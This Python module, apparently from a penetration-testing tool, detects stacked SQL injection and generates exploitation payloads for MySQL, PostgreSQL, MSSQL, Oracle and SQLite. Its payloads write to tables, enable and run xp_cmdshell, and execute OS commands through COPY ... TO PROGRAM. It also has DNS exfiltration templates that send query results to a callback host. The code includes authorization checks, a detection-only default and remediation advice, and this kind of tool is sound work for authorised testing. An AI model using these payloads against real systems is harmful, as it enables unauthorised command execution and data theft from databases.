"""
stacked_queries.py – Stacked Query Detection and Exploitation Engine
====================================================================

Detects whether a target endpoint supports stacked (batched) SQL queries and,
when authorised and in non-detection-only mode, generates exploitation payloads
for a range of DBMSs.

Stacked queries allow multiple SQL statements to be sent in a single parameter
value, separated by a semicolon (``;``).  Support varies significantly:

* **MySQL** – Stacked queries are **not** supported by the PHP ``mysql_*``
  extension but **are** supported via ``mysqli`` (multi-query) and PDO with
  ``PDO::MYSQL_ATTR_MULTI_STATEMENTS`` enabled.
* **PostgreSQL** – Supported natively; any driver that passes the query string
  verbatim will execute multiple statements.
* **MSSQL** – Fully supported; also enables ``xp_cmdshell`` OS command
  execution.
* **Oracle** – Not supported in standard ``SELECT`` context; supported in PL/SQL
  blocks.
* **SQLite** – Supported when using ``sqlite3_exec()`` but not
  ``sqlite3_prepare_v2()`` / ``sqlite3_step()``.

Detection strategy
------------------
The detector uses **time-based confirmation**: a stacked ``SLEEP`` / ``WAITFOR``
statement is injected after the parameter value.  If the response is delayed by
approximately the expected duration, stacked query support is confirmed.

A safe **error-differential** probe is also attempted first: inject a syntactically
invalid second statement and compare the error response against the baseline.
This avoids any sleep delay when the application leaks SQL errors.

Safety
------
* :func:`~sql_attacker.guardrails.check_authorization` is called before *every*
  outbound request – an :class:`~sql_attacker.guardrails.AuthorizationError` is
  raised if ``authorized=False``.
* ``detection_only=True`` (the default) prevents destructive payloads
  (``CREATE``, ``INSERT``, ``UPDATE``, ``DELETE``, ``EXEC``, ``COPY … TO PROGRAM``)
  from being returned or used.

Usage example::

    import requests
    from sql_attacker.engine.config import ScanConfig
    from sql_attacker.stacked_queries import StackedQueryDetector

    def my_request_fn(url, method, params):
        resp = requests.request(method, url, params=params, timeout=15)
        return resp.text, resp.status_code

    cfg = ScanConfig(time_based_enabled=True, time_based_max_delay_seconds=3)
    detector = StackedQueryDetector(
        config=cfg,
        request_fn=my_request_fn,
        authorized=True,
        detection_only=True,
    )

    finding = detector.detect("https://example.com/page", "id", method="GET")
    if finding:
        print(finding.verdict, finding.confidence)
"""

from __future__ import annotations

import logging
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Tuple

from sql_attacker.engine.config import ScanConfig
from sql_attacker.engine.reporting import Evidence, Finding
from sql_attacker.engine.scoring import compute_confidence
from sql_attacker.guardrails import AuthorizationError, check_authorization

__all__ = [
    "StackedQueryDetector",
    "StackedQueryResult",
]

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Type alias for the request callable
# ---------------------------------------------------------------------------

#: ``request_fn(url, method, params) -> (response_text, status_code)``
#:
#: *url*    – Full URL including any existing query string.
#: *method* – HTTP method string, e.g. ``"GET"`` or ``"POST"``.
#: *params* – Mapping of parameter name → value to be sent with the request.
#:            For GET requests the caller should inject into the query string;
#:            for POST requests into the body.  The implementation handles
#:            parameter merging before calling this function.
RequestFn = Callable[[str, str, Dict[str, str]], Tuple[str, int]]

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_TECHNIQUE = "stacked"

# Minimum timing delta (seconds) required to consider a sleep probe successful.
_SLEEP_CONFIRMATION_RATIO = 0.6  # probe_time >= baseline * (1 + ratio) + sleep_s * ratio

# Number of baseline samples for timing estimation.
_BASELINE_SAMPLES = 3

# Supported DBMS identifiers (normalised to lowercase).
_SUPPORTED_DB_TYPES = {"mysql", "postgresql", "mssql", "oracle", "sqlite"}

_DEFAULT_REMEDIATION = (
    "Use parameterised queries (prepared statements) to separate SQL code "
    "from user-supplied data. Never interpolate user input directly into SQL. "
    "Disable multi-statement execution in your database driver where not "
    "required (e.g. avoid PDO::MYSQL_ATTR_MULTI_STATEMENTS=true in MySQL). "
    "Apply the principle of least privilege to database accounts so that even "
    "if injection occurs, the attacker cannot execute DDL/DML or OS commands. "
    "See OWASP SQL Injection Prevention Cheat Sheet for detailed guidance."
)

# ---------------------------------------------------------------------------
# StackedQueryResult
# ---------------------------------------------------------------------------


@dataclass
class StackedQueryResult:
    """Result of a stacked query support probe.

    Attributes
    ----------
    supported:
        ``True`` when at least one stacked query payload produced a
        distinguishable timing or error signal.
    db_type:
        The DBMS type that was confirmed or assumed (e.g. ``"mysql"``).
    payloads_that_worked:
        Ordered list of payloads that elicited a detectable signal.
    evidence:
        Raw :class:`~sql_attacker.engine.reporting.Evidence` observations
        collected during the probe.
    """

    supported: bool
    db_type: str
    payloads_that_worked: List[str] = field(default_factory=list)
    evidence: List[Evidence] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Internal payload tables
# ---------------------------------------------------------------------------

# Detection payloads: inject a harmless stacked statement that causes a
# measurable delay.  The ``{sleep}`` placeholder is replaced at runtime with
# the configured sleep duration.
_DETECTION_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        # Time-based: stacked SLEEP statement (requires multi-query support)
        "'; SELECT SLEEP({sleep});--",
        "'; SELECT SLEEP({sleep})-- -",
        # Error-differential: invalid syntax after semicolon
        "'; INVALID_STACKED_PROBE_SYNTAX;--",
    ],
    "postgresql": [
        # Time-based: stacked pg_sleep
        "'; SELECT pg_sleep({sleep});--",
        "'; SELECT pg_sleep({sleep})-- ",
        # Error-differential
        "'; INVALID_STACKED_PROBE_SYNTAX;--",
    ],
    "mssql": [
        # Time-based: WAITFOR DELAY
        "'; WAITFOR DELAY '0:0:{sleep}';--",
        "'; WAITFOR DELAY '0:0:{sleep}'-- ",
        # Error-differential
        "'; INVALID_STACKED_PROBE_SYNTAX;--",
    ],
    "oracle": [
        # Oracle does not support stacked queries in SQL context;
        # probe via error-differential only.
        "'; INVALID_STACKED_PROBE_SYNTAX;--",
        # PL/SQL anonymous block (only works in PL/SQL execution context)
        "'; BEGIN NULL; END;--",
    ],
    "sqlite": [
        # Time-based: SQLite has no built-in sleep, use a heavy computation
        # to simulate a delay – less reliable, so error-differential first.
        "'; SELECT 1;--",
        "'; INVALID_STACKED_PROBE_SYNTAX;--",
    ],
}

# Exploitation payloads: only returned when detection_only=False AND
# authorized=True.  These perform real write/execution operations.
_EXPLOITATION_PAYLOADS: Dict[str, Dict[str, List[str]]] = {
    "mysql": {
        # Technique: sleep – useful for confirming OOB channels
        "sleep": [
            "'; SELECT SLEEP({sleep});--",
        ],
        # Technique: create – create a marker table to prove write access
        "create": [
            "'; CREATE TABLE IF NOT EXISTS megido_pwned (id INT);--",
        ],
        # Technique: insert – insert a row into an existing table
        "insert": [
            "'; INSERT INTO megido_pwned VALUES (1337);--",
        ],
        # Technique: update – modify an existing record
        "update": [
            "'; UPDATE megido_pwned SET id=1338 WHERE id=1337;--",
        ],
    },
    "postgresql": {
        "sleep": [
            "'; SELECT pg_sleep({sleep});--",
        ],
        "create": [
            "'; CREATE TABLE IF NOT EXISTS megido_pwned (id INTEGER);--",
        ],
        "insert": [
            "'; INSERT INTO megido_pwned VALUES (1337);--",
        ],
        "update": [
            "'; UPDATE megido_pwned SET id=1338 WHERE id=1337;--",
        ],
        # COPY … TO PROGRAM – OS command execution via PostgreSQL superuser
        # Requires pg_execute_server_program privilege or superuser role.
        "copy_to_program": [
            "'; COPY (SELECT 'megido_pwned') TO PROGRAM 'id > /tmp/megido_pwned.txt';--",
            "'; COPY (SELECT version()) TO PROGRAM 'tee /tmp/megido_pg_version.txt';--",
        ],
    },
    "mssql": {
        "sleep": [
            "'; WAITFOR DELAY '0:0:{sleep}';--",
        ],
        "create": [
            "'; CREATE TABLE megido_pwned (id INT);--",
        ],
        "insert": [
            "'; INSERT INTO megido_pwned VALUES (1337);--",
        ],
        "update": [
            "'; UPDATE megido_pwned SET id=1338 WHERE id=1337;--",
        ],
        # xp_cmdshell – OS command execution (requires sysadmin role or
        # explicit EXECUTE permission granted on xp_cmdshell).
        "xp_cmdshell": [
            "'; EXEC xp_cmdshell('whoami');--",
            "'; EXEC xp_cmdshell('dir C:\\\\');--",
            # Enable xp_cmdshell if disabled (requires sysadmin)
            (
                "'; EXEC sp_configure 'show advanced options',1;"
                " RECONFIGURE;"
                " EXEC sp_configure 'xp_cmdshell',1;"
                " RECONFIGURE;"
                " EXEC xp_cmdshell('whoami');--"
            ),
        ],
    },
    "oracle": {
        # Oracle stacking only works inside PL/SQL blocks.
        "sleep": [
            "'; BEGIN DBMS_LOCK.SLEEP({sleep}); END;--",
        ],
        "create": [
            "'; BEGIN EXECUTE IMMEDIATE 'CREATE TABLE megido_pwned (id NUMBER)'; END;--",
        ],
        "insert": [
            "'; BEGIN EXECUTE IMMEDIATE 'INSERT INTO megido_pwned VALUES (1337)'; END;--",
        ],
        "update": [
            "'; BEGIN EXECUTE IMMEDIATE 'UPDATE megido_pwned SET id=1338 WHERE id=1337'; END;--",
        ],
    },
    "sqlite": {
        "sleep": [
            # SQLite has no sleep; heavy recursive CTE as poor-man's delay
            (
                "'; WITH RECURSIVE r(i) AS "
                "(SELECT 1 UNION ALL SELECT i+1 FROM r WHERE i<1000000) "
                "SELECT MAX(i) FROM r;--"
            ),
        ],
        "create": [
            "'; CREATE TABLE IF NOT EXISTS megido_pwned (id INTEGER);--",
        ],
        "insert": [
            "'; INSERT INTO megido_pwned VALUES (1337);--",
        ],
        "update": [
            "'; UPDATE megido_pwned SET id=1338 WHERE id=1337;--",
        ],
    },
}

# DNS exfiltration query templates.  ``{query}`` is replaced with the SQL
# sub-query whose result you want to exfiltrate; ``{host}`` is the callback
# host.  The exfiltrated value is encoded as a DNS label (first component of
# the FQDN sent to the callback server).
_DNS_EXFIL_TEMPLATES: Dict[str, str] = {
    # MySQL: uses LOAD_FILE with a UNC path (Windows only) or
    # a direct DNS lookup via user-defined function (requires UDF).
    # The common approach is a sub-select concatenated into a hostname.
    "mysql": (
        "; SELECT LOAD_FILE(CONCAT('\\\\\\\\', ({query}), '.{host}\\\\megido'));--"
    ),
    # PostgreSQL: COPY TO PROGRAM with nslookup / curl
    "postgresql": (
        "; COPY (SELECT ({query})) TO PROGRAM "
        "'nslookup $( ({query}) ).{host}';--"
    ),
    # MSSQL: xp_dirtree or xp_fileexist with a UNC path causes DNS lookup
    "mssql": (
        "; DECLARE @v NVARCHAR(256);"
        " SET @v=(SELECT TOP 1 CAST(({query}) AS NVARCHAR(200)));"
        " EXEC master.dbo.xp_dirtree N'\\\\'+@v+N'.{host}\\megido',1,1;--"
    ),
    # Oracle: UTL_HTTP or UTL_INADDR (requires EXECUTE privilege)
    "oracle": (
        "; BEGIN "
        "  UTL_HTTP.REQUEST('http://'||({query})||'.{host}/megido'); "
        "END;--"
    ),
    # SQLite: no built-in network functions.  The payload references a
    # hypothetical custom extension and embeds the callback host as a
    # comment.  In practice, OS-level command injection via a loaded
    # extension is required to achieve DNS exfiltration from SQLite.
    "sqlite": (
        "; SELECT load_extension('/tmp/megido_dns_exfil.so', "
        "'sqlite3_megido_exfil_init');--"
        " /* callback:{host} query:({query})"
        " NOTE: requires a custom loaded extension;"
        " standard SQLite has no built-in DNS exfiltration primitive. */"
    ),
}


# ---------------------------------------------------------------------------
# StackedQueryDetector
# ---------------------------------------------------------------------------


class StackedQueryDetector:
    """Detect and (optionally) exploit stacked SQL query injection.

    Parameters
    ----------
    config:
        :class:`~sql_attacker.engine.config.ScanConfig` instance controlling
        timeouts, retries and timing thresholds.
    request_fn:
        Callable with signature
        ``(url: str, method: str, params: dict) -> (response_text: str, status_code: int)``.
        The caller is responsible for constructing the HTTP request; the
        detector supplies the parameter values.
    authorized:
        Must be explicitly ``True`` before any outbound request is made.
        Defaults to ``False`` (fail-closed).
    detection_only:
        When ``True`` (default) only harmless detection payloads (timing
        probes and error-differentials) are used.  Destructive payloads
        (``CREATE``, ``INSERT``, ``UPDATE``, ``EXEC xp_cmdshell``,
        ``COPY … TO PROGRAM``) are never sent or returned to the caller.
    """

    def __init__(
        self,
        config: ScanConfig,
        request_fn: RequestFn,
        authorized: bool = False,
        detection_only: bool = True,
    ) -> None:
        self._config = config
        self._request_fn = request_fn
        self._authorized = authorized
        self._detection_only = detection_only

        # Derive the sleep duration from ScanConfig when available.
        sleep_attr = getattr(config, "time_based_max_delay_seconds", None)
        self._sleep_seconds: int = int(sleep_attr) if sleep_attr else 3

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def detect(
        self,
        url: str,
        parameter: str,
        method: str = "GET",
    ) -> Optional[Finding]:
        """Probe *url* for stacked query support on *parameter*.

        The method:

        1. Collects a timing baseline (``_BASELINE_SAMPLES`` requests with
           an inert parameter value).
        2. Iterates over detection payloads for each supported DBMS in a
           most-likely-first order.
        3. Sends each payload and compares the response time / body against
           the baseline.
        4. On a positive signal, builds a :class:`~sql_attacker.engine.reporting.Finding`
           and returns immediately (first confirmed finding wins).

        Authorization is checked via
        :func:`~sql_attacker.guardrails.check_authorization` before every
        outbound request.  If ``authorized=False`` this method raises
        :class:`~sql_attacker.guardrails.AuthorizationError`.

        Parameters
        ----------
        url:
            Target endpoint URL.
        parameter:
            Name of the HTTP parameter to inject into.
        method:
            HTTP method; ``"GET"`` or ``"POST"``.

        Returns
        -------
        Optional[Finding]
            A populated :class:`~sql_attacker.engine.reporting.Finding` when
            stacked query support is detected, or ``None`` when no signal was
            found.

        Raises
        ------
        AuthorizationError
            When ``authorized=False``.
        """
        check_authorization(self._authorized)

        method = method.upper()
        baseline_times, baseline_body, baseline_status = self._collect_baseline(
            url, parameter, method
        )
        if not baseline_times:
            logger.warning(
                "stacked_queries: could not collect baseline for %s[%s]",
                url,
                parameter,
            )
            return None

        baseline_median = _median(baseline_times)
        logger.debug(
            "stacked_queries: baseline median=%.3fs for %s[%s]",
            baseline_median,
            url,
            parameter,
        )

        # Probe in DBMS order (most commonly encountered first)
        db_order = ["mssql", "postgresql", "mysql", "sqlite", "oracle"]
        all_evidence: List[Evidence] = []

        for db_type in db_order:
            payloads = self.get_detection_payloads(db_type)
            for raw_payload in payloads:
                payload = raw_payload.format(sleep=self._sleep_seconds)
                evidence = self._probe(
                    url=url,
                    parameter=parameter,
                    method=method,
                    payload=payload,
                    db_type=db_type,
                    baseline_median=baseline_median,
                    baseline_body=baseline_body,
                    baseline_status=baseline_status,
                )
                if evidence is None:
                    continue
                all_evidence.append(evidence)

                # Determine which signal was triggered
                signals = _extract_signals(evidence)
                if signals:
                    result = StackedQueryResult(
                        supported=True,
                        db_type=db_type,
                        payloads_that_worked=[payload],
                        evidence=[evidence],
                    )
                    return self._build_finding(
                        url=url,
                        parameter=parameter,
                        method=method,
                        result=result,
                        signals=signals,
                    )

        logger.debug(
            "stacked_queries: no positive signal for %s[%s]",
            url,
            parameter,
        )
        return None

    def get_detection_payloads(self, db_type: str = "mysql") -> List[str]:
        """Return detection-safe payloads for *db_type*.

        Detection payloads cause only a time delay or trigger an error
        differential; they do **not** perform any write or OS operations.

        The ``{sleep}`` placeholder in the returned strings is replaced at
        call-time with ``self._sleep_seconds``.  Callers that need the raw
        template strings may use them directly.

        Parameters
        ----------
        db_type:
            DBMS name (case-insensitive).  One of ``"mysql"``,
            ``"postgresql"``, ``"mssql"``, ``"oracle"``, ``"sqlite"``.
            Falls back to ``"mysql"`` for unknown values.

        Returns
        -------
        List[str]
            Ordered list of payload templates (``{sleep}`` placeholder).
        """
        key = db_type.lower().strip()
        return list(_DETECTION_PAYLOADS.get(key, _DETECTION_PAYLOADS["mysql"]))

    def get_exploitation_payloads(
        self,
        db_type: str,
        technique: str = "sleep",
    ) -> List[str]:
        """Return exploitation payloads for *db_type* and *technique*.

        .. warning::
            This method returns an **empty list** when ``detection_only=True``
            (the default).  You must construct the detector with
            ``detection_only=False`` *and* ``authorized=True`` to receive
            exploitation payloads.

        Supported techniques per DBMS:

        +-------------+----------------------------------------------------------+
        | DBMS        | Techniques                                               |
        +=============+==========================================================+
        | mysql       | ``sleep``, ``create``, ``insert``, ``update``            |
        +-------------+----------------------------------------------------------+
        | postgresql  | ``sleep``, ``create``, ``insert``, ``update``,           |
        |             | ``copy_to_program``                                      |
        +-------------+----------------------------------------------------------+
        | mssql       | ``sleep``, ``create``, ``insert``, ``update``,           |
        |             | ``xp_cmdshell``                                          |
        +-------------+----------------------------------------------------------+
        | oracle      | ``sleep``, ``create``, ``insert``, ``update``            |
        +-------------+----------------------------------------------------------+
        | sqlite      | ``sleep``, ``create``, ``insert``, ``update``            |
        +-------------+----------------------------------------------------------+

        Parameters
        ----------
        db_type:
            DBMS name (case-insensitive).
        technique:
            Exploitation technique name (case-insensitive).  Defaults to
            ``"sleep"``.

        Returns
        -------
        List[str]
            Ordered list of payload strings (``{sleep}`` placeholder already
            substituted with ``self._sleep_seconds``).  Empty when
            ``detection_only=True``.

        Raises
        ------
        AuthorizationError
            When ``authorized=False`` and ``detection_only=False`` – the
            caller must hold authorization before requesting exploitation
            payloads.
        """
        if self._detection_only:
            logger.info(
                "stacked_queries: get_exploitation_payloads called but "
                "detection_only=True – returning empty list"
            )
            return []

        # Require explicit authorization before handing out exploitation payloads.
        check_authorization(self._authorized)

        key_db = db_type.lower().strip()
        key_tech = technique.lower().strip()
        db_map = _EXPLOITATION_PAYLOADS.get(key_db, {})
        raw_payloads = db_map.get(key_tech, [])
        return [p.format(sleep=self._sleep_seconds) for p in raw_payloads]

    def generate_dns_exfil_payload(
        self,
        db_type: str,
        query: str,
        callback_host: str,
    ) -> str:
        """Generate a DNS exfiltration payload for *db_type*.

        DNS exfiltration embeds the result of a SQL *query* as a sub-domain
        label in a DNS lookup directed at *callback_host*.  A DNS listener
        on *callback_host* (e.g. `Burp Collaborator`_, `interactsh`_, or a
        custom ``nslookup`` watcher) captures the exfiltrated value.

        .. _Burp Collaborator: https://portswigger.net/burp/documentation/collaborator
        .. _interactsh: https://github.com/projectdiscovery/interactsh

        .. warning::
            Returned payloads are **informational only** when
            ``detection_only=True``.  The caller is responsible for ensuring
            authorization before sending them.

        .. warning:: **PostgreSQL shell injection risk**
            The PostgreSQL template passes the *query* value into a shell
            command via ``COPY … TO PROGRAM``.  If *query* contains shell
            metacharacters (backticks, ``$(...)``, ``|``, ``;``, etc.) the
            resulting shell command may behave unexpectedly.  Callers **must**
            ensure that *query* contains only a plain SQL expression with no
            shell-special characters before using this payload.  A safe
            pattern is to restrict *query* to alphanumeric SQL built-ins such
            as ``"SELECT version()"`` or ``"SELECT current_user"``.

        Parameters
        ----------
        db_type:
            DBMS name (case-insensitive).  Supported: ``"mysql"``,
            ``"postgresql"``, ``"mssql"``, ``"oracle"``, ``"sqlite"``.
        query:
            SQL expression whose single-row, single-column result will be
            exfiltrated, e.g. ``"SELECT @@version"`` or ``"SELECT user()"``.
            Must not include a trailing semicolon.  For PostgreSQL, must not
            contain shell metacharacters (see warning above).
        callback_host:
            Fully-qualified hostname of the DNS callback listener, e.g.
            ``"abc123.burpcollaborator.net"``.

        Returns
        -------
        str
            A stacked-query injection payload with the exfiltration logic
            embedded.  The ``{query}`` and ``{host}`` placeholders are
            substituted with *query* and *callback_host* respectively.

        Raises
        ------
        ValueError
            When *db_type* is not recognised.
        """
        key = db_type.lower().strip()
        if key not in _DNS_EXFIL_TEMPLATES:
            raise ValueError(
                f"Unsupported db_type for DNS exfiltration: {db_type!r}. "
                f"Supported: {sorted(_DNS_EXFIL_TEMPLATES)}"
            )
        template = _DNS_EXFIL_TEMPLATES[key]
        return template.format(query=query, host=callback_host)

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _collect_baseline(
        self,
        url: str,
        parameter: str,
        method: str,
    ) -> Tuple[List[float], str, int]:
        """Send ``_BASELINE_SAMPLES`` benign requests and return timing/body.

        Returns
        -------
        Tuple[List[float], str, int]
            ``(timing_samples_seconds, last_response_body, last_status_code)``
        """
        times: List[float] = []
        body = ""
        status = 0
        benign_value = "1"

        for _ in range(_BASELINE_SAMPLES):
            check_authorization(self._authorized)
            params = {parameter: benign_value}
            t_start = time.monotonic()
            try:
                result = self._request_fn(url, method, params)
                body, status = _unpack_result(result)
            except Exception as exc:  # noqa: BLE001
                logger.debug("stacked_queries: baseline request error: %s", exc)
                continue
            elapsed = time.monotonic() - t_start
            times.append(elapsed)

        return times, body, status

    def _probe(
        self,
        url: str,
        parameter: str,
        method: str,
        payload: str,
        db_type: str,
        baseline_median: float,
        baseline_body: str,
        baseline_status: int,
    ) -> Optional[Evidence]:
        """Send a single injection payload and return an Evidence if a signal fires.

        Returns ``None`` on request failure or when no signal is detected.
        """
        check_authorization(self._authorized)

        params = {parameter: payload}
        t_start = time.monotonic()
        try:
            result = self._request_fn(url, method, params)
            resp_body, resp_status = _unpack_result(result)
        except Exception as exc:  # noqa: BLE001
            logger.debug(
                "stacked_queries: probe request error for payload %r: %s",
                payload,
                exc,
            )
            return None
        elapsed = time.monotonic() - t_start

        # Determine technique label for Evidence
        is_sleep_payload = (
            "SLEEP" in payload.upper()
            or "PG_SLEEP" in payload.upper()
            or "WAITFOR" in payload.upper()
            or "DBMS_LOCK" in payload.upper()
        )
        technique_label = "time" if is_sleep_payload else "error"

        # Build a concise request summary (no secrets exposed)
        request_summary = _build_request_summary(url, parameter, payload, method)

        evidence = Evidence(
            payload=payload,
            request_summary=request_summary,
            response_length=len(resp_body),
            response_body_excerpt=resp_body[:512],
            timing_samples_ms=[round(elapsed * 1000, 2)],
            baseline_median_ms=round(baseline_median * 1000, 2),
            technique=technique_label,
        )

        # --- Timing signal ------------------------------------------------
        if is_sleep_payload:
            # Confirm if the response took at least (sleep_s * ratio) seconds
            # longer than the baseline.
            expected_delay = self._sleep_seconds * _SLEEP_CONFIRMATION_RATIO
            if elapsed >= baseline_median + expected_delay:
                logger.info(
                    "stacked_queries: timing signal confirmed "
                    "(elapsed=%.3fs, baseline=%.3fs, payload=%r, db=%s)",
                    elapsed,
                    baseline_median,
                    payload,
                    db_type,
                )
                return evidence

        # --- Error-differential signal ------------------------------------
        # A meaningful change in status code or response body indicates that
        # the injected second statement altered server behaviour.
        body_changed = _body_changed_significantly(baseline_body, resp_body)
        status_changed = resp_status != baseline_status

        if body_changed or status_changed:
            logger.info(
                "stacked_queries: error-differential signal "
                "(status_changed=%s, body_changed=%s, db=%s, payload=%r)",
                status_changed,
                body_changed,
                db_type,
                payload,
            )
            return evidence

        return None

    def _build_finding(
        self,
        url: str,
        parameter: str,
        method: str,
        result: StackedQueryResult,
        signals: List[str],
    ) -> Finding:
        """Translate a :class:`StackedQueryResult` into a :class:`Finding`."""
        feature_dict: Dict[str, Any] = {}
        for sig in signals:
            feature_dict[sig] = 1.0

        scoring_result = compute_confidence(feature_dict)
        confidence = scoring_result.score
        verdict = scoring_result.verdict

        return Finding(
            parameter=parameter,
            technique=_TECHNIQUE,
            db_type=result.db_type,
            confidence=confidence,
            verdict=verdict,
            evidence=result.evidence,
            remediation=_DEFAULT_REMEDIATION,
            url=url,
            method=method,
            score_rationale=scoring_result.rationale,
        )


# ---------------------------------------------------------------------------
# Module-level helpers
# ---------------------------------------------------------------------------


def _median(values: List[float]) -> float:
    """Return the median of *values*.  Returns 0.0 for an empty list."""
    if not values:
        return 0.0
    sorted_vals = sorted(values)
    mid = len(sorted_vals) // 2
    if len(sorted_vals) % 2 == 0:
        return (sorted_vals[mid - 1] + sorted_vals[mid]) / 2.0
    return sorted_vals[mid]


def _unpack_result(result: Any) -> Tuple[str, int]:
    """Unpack the return value of ``request_fn`` into ``(body, status)``.

    Supports both ``(str, int)`` tuples and plain ``str`` returns (status
    defaults to 200 in that case).
    """
    if isinstance(result, tuple) and len(result) == 2:
        body, status = result
        return str(body), int(status)
    return str(result), 200


def _body_changed_significantly(baseline: str, probe: str) -> bool:
    """Return True if the body lengths differ by more than 10 %.

    A simple length heuristic is used to avoid false positives from dynamic
    content (timestamps, ads, etc.).  A 10 % threshold balances sensitivity
    against noise.
    """
    if not baseline:
        return bool(probe)
    baseline_len = len(baseline)
    probe_len = len(probe)
    if baseline_len == 0:
        return probe_len > 0
    ratio = abs(probe_len - baseline_len) / baseline_len
    return ratio > 0.10


def _extract_signals(evidence: Evidence) -> List[str]:
    """Map an Evidence object to scoring feature names.

    Returns an ordered list of feature keys recognised by
    :func:`~sql_attacker.engine.scoring.compute_confidence`.
    """
    signals: List[str] = []
    if evidence.technique == "time" and evidence.timing_samples_ms:
        observed_ms = evidence.timing_samples_ms[0]
        baseline_ms = evidence.baseline_median_ms or 0.0
        if observed_ms > baseline_ms + 500:  # at least 500 ms delta
            signals.append("timing_delta_significant")
    if evidence.technique == "error":
        signals.append("content_change")
        if evidence.response_body_excerpt:
            signals.append("sql_error_pattern")
    return signals


def _build_request_summary(
    url: str, parameter: str, payload: str, method: str
) -> str:
    """Build a human-readable, secret-free request description.

    The payload is URL-encoded when constructing a GET-style summary so that
    the string can be pasted directly into a browser or cURL command.
    """
    encoded = urllib.parse.quote(payload, safe="")
    if method.upper() == "GET":
        separator = "&" if "?" in url else "?"
        return f"GET {url}{separator}{parameter}={encoded} HTTP/1.1"
    return f"POST {url} HTTP/1.1  body: {parameter}={encoded}"
